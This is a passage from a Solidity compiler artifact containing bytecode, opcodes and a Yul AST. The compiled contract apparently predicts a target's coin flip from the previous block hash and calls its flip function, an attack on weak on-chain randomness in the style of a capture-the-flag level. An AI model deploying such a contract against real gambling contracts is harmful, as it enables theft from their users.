														"nodeType": "YulTypedName",
														"src": "716:5:1",
														"type": ""
													}
												],
												"src": "680:122:1"
											}
										]
									},
									"contents": "{\n\n    function abi_decode_t_address_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"linkReferences": {},
							"object": "60806040527f800000000000000000000000000000000000000000000000000000000000000060025534801561003457600080fd5b506040516103fe3803806103fe833981810160405281019061005691906100b1565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610123565b6000815190506100ab8161010c565b92915050565b6000602082840312156100c357600080fd5b60006100d18482850161009c565b91505092915050565b60006100e5826100ec565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b610115816100da565b811461012057600080fd5b50565b6102cc806101326000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063cde4efa914610030575b600080fd5b61003861003a565b005b600060014361004991906101d7565b4060001c905080600154141561005e57600080fd5b8060018190555060006002548261007591906101a6565b905060006001821461008857600061008b565b60015b905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f67826040518263ffffffff1660e01b81526004016100e6919061018b565b602060405180830381600087803b15801561010057600080fd5b505af1158015610114573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101389190610153565b50505050565b60008151905061014d8161027f565b92915050565b60006020828403121561016557600080fd5b60006101738482850161013e565b91505092915050565b6101858161020b565b82525050565b60006020820190506101a0600083018461017c565b92915050565b60006101b182610217565b91506101bc83610217565b9250826101cc576101cb610250565b5b828204905092915050565b60006101e282610217565b91506101ed83610217565b925082821015610200576101ff610221565b5b828203905092915050565b60008115159050919050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b6102888161020b565b811461029357600080fd5b5056fea26469706673582212205eb699bca14c130a68669dc753d1d2205415858a009b8a27ce366bc7b8564a1f64736f6c63430008000033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH1 0x2 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x34 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x3FE CODESIZE SUB DUP1 PUSH2 0x3FE DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x56 SWAP2 SWAP1 PUSH2 0xB1 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x123 JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0xAB DUP2 PUSH2 0x10C JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xC3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0xD1 DUP5 DUP3 DUP6 ADD PUSH2 0x9C JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xE5 DUP3 PUSH2 0xEC JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x115 DUP2 PUSH2 0xDA JUMP JUMPDEST DUP2 EQ PUSH2 0x120 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x2CC DUP1 PUSH2 0x132 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xCDE4EFA9 EQ PUSH2 0x30 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x38 PUSH2 0x3A JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH1 0x1 NUMBER PUSH2 0x49 SWAP2 SWAP1 PUSH2 0x1D7 JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP DUP1 PUSH1 0x1 SLOAD EQ ISZERO PUSH2 0x5E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 PUSH1 0x2 SLOAD DUP3 PUSH2 0x75 SWAP2 SWAP1 PUSH2 0x1A6 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0x88 JUMPI PUSH1 0x0 PUSH2 0x8B JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xE6 SWAP2 SWAP1 PUSH2 0x18B JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x100 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x114 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x138 SWAP2 SWAP1 PUSH2 0x153 JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x14D DUP2 PUSH2 0x27F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x165 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x173 DUP5 DUP3 DUP6 ADD PUSH2 0x13E JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x185 DUP2 PUSH2 0x20B JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1A0 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x17C JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1B1 DUP3 PUSH2 0x217 JUMP JUMPDEST SWAP2 POP PUSH2 0x1BC DUP4 PUSH2 0x217 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x1CC JUMPI PUSH2 0x1CB PUSH2 0x250 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1E2 DUP3 PUSH2 0x217 JUMP JUMPDEST SWAP2 POP PUSH2 0x1ED DUP4 PUSH2 0x217 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x200 JUMPI PUSH2 0x1FF PUSH2 0x221 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH2 0x288 DUP2 PUSH2 0x20B JUMP JUMPDEST DUP2 EQ PUSH2 0x293 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x5E 0xB6 SWAP10 0xBC LOG1 0x4C SGT EXP PUSH9 0x669DC753D1D2205415 DUP6 DUP11 STOP SWAP12 DUP11 0x27 0xCE CALLDATASIZE PUSH12 0xC7B8564A1F64736F6C634300 ADDMOD STOP STOP CALLER ",
							"sourceMap": "830:613:0:-:0;;;922:77;905:94;;1008:82;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1069:8;1049;;:29;;;;;;;;;;;;;;;;;;1008:82;830:613;;7:143:1;;95:6;89:13;80:22;;111:33;138:5;111:33;:::i;:::-;70:80;;;;:::o;156:284::-;;275:2;263:9;254:7;250:23;246:32;243:2;;;291:1;288;281:12;243:2;334:1;359:64;415:7;406:6;395:9;391:22;359:64;:::i;:::-;349:74;;305:128;233:207;;;;:::o;446:96::-;;512:24;530:5;512:24;:::i;:::-;501:35;;491:51;;;:::o;548:126::-;;625:42;618:5;614:54;603:65;;593:81;;;:::o;680:122::-;753:24;771:5;753:24;:::i;:::-;746:5;743:35;733:2;;792:1;789;782:12;733:2;723:79;:::o;830:613:0:-;;;;;;;"
						},
						"deployedBytecode": {
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:1823:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "67:77:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "77:22:1",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "92:6:1"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "86:5:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "86:13:1"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "77:5:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "132:5:1"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_bool",
																	"nodeType": "YulIdentifier",
																	"src": "108:23:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "108:30:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "108:30:1"
														}
													]
												},
												"name": "abi_decode_t_bool_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "45:6:1",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "53:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "61:5:1",
														"type": ""
													}
												],
												"src": "7:137:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "224:204:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "270:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "279:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "282:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "272:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "272:12:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "272:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "245:7:1"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "254:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "241:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "241:23:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "266:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "237:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "237:32:1"
															},
															"nodeType": "YulIf",
															"src": "234:2:1"
														},
														{
															"nodeType": "YulBlock",
															"src": "296:125:1",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "311:15:1",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "325:1:1",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "315:6:1",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "340:71:1",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "383:9:1"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "394:6:1"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "379:3:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "379:22:1"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "403:7:1"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_bool_fromMemory",
																			"nodeType": "YulIdentifier",
																			"src": "350:28:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "350:61:1"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "340:6:1"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_bool_fromMemory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "194:9:1",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "205:7:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "217:6:1",
														"type": ""
													}
												],
												"src": "150:278:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "493:50:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "510:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "530:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_bool",
																			"nodeType": "YulIdentifier",
																			"src": "515:14:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "515:21:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "503:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "503:34:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "503:34:1"
														}
													]
												},
												"name": "abi_encode_t_bool_to_t_bool_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "481:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "488:3:1",
														"type": ""
													}
												],
												"src": "434:109:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "641:118:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "651:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "663:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "674:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "659:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "659:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "651:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "725:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "738:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "749:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "734:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "734:17:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bool_to_t_bool_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "687:37:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "687:65:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "687:65:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "613:9:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "625:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "636:4:1",
														"type": ""
													}
												],
												"src": "549:210:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "807:143:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "817:25:1",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "840:1:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "822:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "822:20:1"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "817:1:1"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "851:25:1",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "874:1:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "856:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "856:20:1"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "851:1:1"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "898:22:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x12",
																				"nodeType": "YulIdentifier",
																				"src": "900:16:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "900:18:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "900:18:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "895:1:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "888:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "888:9:1"
															},
															"nodeType": "YulIf",
															"src": "885:2:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "930:14:1",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "939:1:1"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "942:1:1"
																	}
																],
																"functionName": {
																	"name": "div",
																	"nodeType": "YulIdentifier",
																	"src": "935:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "935:9:1"
															},
															"variableNames": [
																{
																	"name": "r",
																	"nodeType": "YulIdentifier",
																	"src": "930:1:1"
																}
															]
														}
													]
												},
												"name": "checked_div_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "796:1:1",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "799:1:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "r",
														"nodeType": "YulTypedName",
														"src": "805:1:1",
														"type": ""
													}
												],
												"src": "765:185:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1001:146:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1011:25:1",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1034:1:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1016:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1016:20:1"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "1011:1:1"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1045:25:1",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1068:1:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1050:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1050:20:1"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "1045:1:1"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1092:22:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nodeType": "YulIdentifier",
																				"src": "1094:16:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1094:18:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1094:18:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1086:1:1"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1089:1:1"
																	}
																],
																"functionName": {
																	"name": "lt",
																	"nodeType": "YulIdentifier",
																	"src": "1083:2:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1083:8:1"
															},
															"nodeType": "YulIf",
															"src": "1080:2:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1124:17:1",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1136:1:1"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1139:1:1"
																	}
																],
																"functionName": {
																	"name": "sub",
																	"nodeType": "YulIdentifier",
																	"src": "1132:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1132:9:1"
															},
															"variableNames": [
																{
																	"name": "diff",
																	"nodeType": "YulIdentifier",
																	"src": "1124:4:1"
																}
															]
														}
													]
												},
												"name": "checked_sub_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "987:1:1",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "990:1:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "diff",
														"nodeType": "YulTypedName",
														"src": "996:4:1",
														"type": ""
													}
												],
												"src": "956:191:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1195:48:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1205:32:1",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1230:5:1"
																			}
																		],
																		"functionName": {
																			"name": "iszero",
																			"nodeType": "YulIdentifier",
																			"src": "1223:6:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1223:13:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "1216:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1216:21:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1205:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1177:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1187:7:1",
														"type": ""
													}
												],
												"src": "1153:90:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1294:32:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1304:16:1",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "1315:5:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1304:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1276:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1286:7:1",
														"type": ""
													}
												],
												"src": "1249:77:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1360:152:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1377:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1380:77:1",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1370:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1370:88:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1370:88:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1474:1:1",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1477:4:1",
																		"type": "",
																		"value": "0x11"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1467:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1467:15:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1467:15:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1498:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1501:4:1",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "1491:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1491:15:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1491:15:1"
														}
													]
												},
												"name": "panic_error_0x11",
												"nodeType": "YulFunctionDefinition",
												"src": "1332:180:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1546:152:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1563:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1566:77:1",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
